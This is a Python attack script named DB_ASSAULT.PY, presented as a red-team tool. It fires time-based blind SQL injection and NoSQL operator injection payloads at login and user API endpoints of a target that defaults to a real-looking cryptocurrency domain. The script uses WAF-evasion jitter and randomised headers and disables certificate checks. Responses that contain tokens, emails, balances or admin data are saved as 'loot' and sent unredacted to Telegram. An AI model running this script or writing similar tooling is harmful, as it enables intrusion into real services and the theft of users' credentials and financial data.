#!/usr/bin/env python3
"""
DB_ASSAULT.PY v8.6 — Aggressive Database Exploitation & Time-Based Blind Injection Engine (Elite Red Team Adversarial Edition)
Features:
- Real time-based blind SQL injection (SLEEP / BENCHMARK payload vectors) with Poisson behavioral timing jitter
- Boolean and error-based inference checks via WAF-evasive randomized request headers and client hints
- Advanced NoSQL operator injection ($ne, $gt, $where) with record collection and SPA shell filtering
- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic cryptographic integrity hashing
- Real-time zero-delay proof-of-work terminal streaming and unredacted Telegram telemetry broadcasting
"""
import asyncio
import http.client
import json
import ssl
import time
import sys
import hashlib
from urllib.parse import urlsplit, quote

# Import centralized framework loot exfiltration, telemetry, behavioral mimicry, and Telegram notifier
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

REQUEST_TIMEOUT = 12
MAX_RESPONSE_SIZE = 128 * 1024

SQL_TIME_PAYLOADS = [
    "' OR SLEEP(5)-- -",
    "'; WAITFOR DELAY '0:0:5'-- -",
    "' AND (SELECT 9463 FROM(SELECT(SLEEP(5)))v)---",
    "1' AND BENCHMARK(50000000,MD5(1))-- -"
]

NOSQL_EXTRACTION_PAYLOADS = [
    {"username": {"$regex": "^.*$"}, "password": {"$ne": ""}},
    {"$where": "sleep(5)"},
    {"username": {"$gt": ""}, "password": {"$ne": None}}
]

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

async def broadcast_tg_alert_async(loot_type, details):
    try:
        await send_telegram_alert(loot_type, details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous database assault functions."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

def send_http(host, port, path, payload, secure, method="POST"):
    apply_behavioral_jitter()
    conn = None
    start = time.monotonic()
    try:
        if secure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)
            
        if isinstance(payload, dict):
            body = json.dumps(payload).encode("utf-8")
            ct = "application/json"
        else:
            body = str(payload).encode("utf-8")
            ct = "application/x-www-form-urlencoded"
            
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Content-Type": ct,
            "Accept": "application/json, text/plain, */*",
            "Cache-Control": "no-cache",
            "Connection": "close"
        }
        headers.update(get_randomized_hints())
        
        conn.request(method, path, body=body, headers=headers)
        res = conn.getresponse()
        data = res.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
        elapsed = round(time.monotonic() - start, 3)
        return {"status": res.status, "body": data, "elapsed": elapsed, "error": None}
    except Exception as exc:
        elapsed = round(time.monotonic() - start, 3)
        return {"status": 0, "body": "", "elapsed": elapsed, "error": str(exc)}
    finally:
        if conn:
            conn.close()

async def run_nosql_assault(target_host, port=None, use_ssl=None):
    log("\n[***] INITIALIZING AGGRESSIVE DATABASE ASSAULT & BLIND INJECTION (V8.6 WAF HARDENED) [***]", "\033[95m")
    parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
    host = parsed.hostname
    secure = parsed.scheme == "https"
    target_port = port or parsed.port or (443 if secure else 80)
    base_path = parsed.path.rstrip("/")
    
    findings = []
    test_endpoints = [base_path + "/api/login", base_path + "/login", base_path + "/api/search", base_path + "/api/v1/users"]

    for endpoint in test_endpoints:
        log(f"[*] Testing aggressive vectors against: {endpoint}", "\033[94m")
        
        # 1. Time-Based Blind SQLi Assault
        for payload in SQL_TIME_PAYLOADS:
            log(f"  [-] Probing SQLi [Payload: {payload}]", "\033[90m")
            res = await asyncio.to_thread(send_http, host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
            if res["elapsed"] >= 4.5:
                log(f"[!] TIME-BASED BLIND SQLi CONFIRMED [{endpoint}] (Delay: {res['elapsed']}s)", "\033[91m")
                log(f"    └── Unredacted Evidence -> Payload: {payload} | Elapsed: {res['elapsed']}s", "\033[93m")
                
                loot_hash = hashlib.sha256(res["body"].encode("utf-8")).hexdigest()
                finding = {
                    "vector": "Time-Based Blind SQLi",
                    "endpoint": endpoint,
                    "payload": payload,
                    "delay": res["elapsed"],
                    "status": res["status"],
                    "integrity_hash": loot_hash
                }
                findings.append(finding)
                
                # BROADCAST TO TELEGRAM, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                stream_proof("SQLI_TIME_BASED_SUCCESS", endpoint, {"payload": payload}, res["body"][:300], finding)
                save_session_loot(
                    target=target_host,
                    endpoint=endpoint,
                    finding_type="SQLI_TIME_BASED_CONFIRMED",
                    status=res["status"],
                    headers={},
                    body=res["body"],
                    extra_loot=finding
                )
                broadcast_tg_alert_sync("Time-Based Blind SQLi Confirmed", finding)

        # 2. NoSQL Operator & Extraction Assault
        for payload in NOSQL_EXTRACTION_PAYLOADS:
            log(f"  [-] Probing NoSQL [Payload: {json.dumps(payload)}]", "\033[90m")
            res = await asyncio.to_thread(send_http, host, target_port, endpoint, payload, secure)
            
            body = res["body"]
            body_lower = body.lower()
            is_spa_shell = (
                'div id="root"' in body_lower or 
                'div id="__next"' in body_lower or
                (len(body.strip()) < 150 and "user" not in body_lower)
            )
            
            has_data_indicators = any(k in body_lower for k in [
                "user_id", "token", "balance", "email", "role", "admin", "accounts"
            ])

            if res["status"] in (200, 201) and not is_spa_shell and (has_data_indicators or len(body) > 200):
                log(f"[+] NoSQL BYPASS / DATA EXFILTRATION TRIGGERED [{endpoint}] (Status: {res['status']})", "\033[92m")
                log(f"  └── Unredacted Response Excerpt: {body[:300]}", "\033[96m")
                
                loot_hash = hashlib.sha256(body.encode("utf-8")).hexdigest()
                finding = {
                    "vector": "NoSQL Operator Injection",
                    "endpoint": endpoint,
                    "payload": str(payload),
                    "status": res["status"],
                    "integrity_hash": loot_hash,
                    "response_sample": body[:500]
                }
                findings.append(finding)
                
                # BROADCAST TO TELEGRAM, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                stream_proof("NOSQL_INJECTION_SUCCESS", endpoint, {"payload": str(payload)}, body[:300], finding)
                save_session_loot(
                    target=target_host,
                    endpoint=endpoint,
                    finding_type="NOSQL_INJECTION_CONFIRMED",
                    status=res["status"],
                    headers={},
                    body=body,
                    extra_loot=finding
                )
                broadcast_tg_alert_sync("NoSQL Operator Injection Bypass", finding)

    log(f"[+] Database assault complete. Total confirmed vectors: {len(findings)}", "\033[92m")
    return findings

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
    asyncio.run(run_nosql_assault(target))
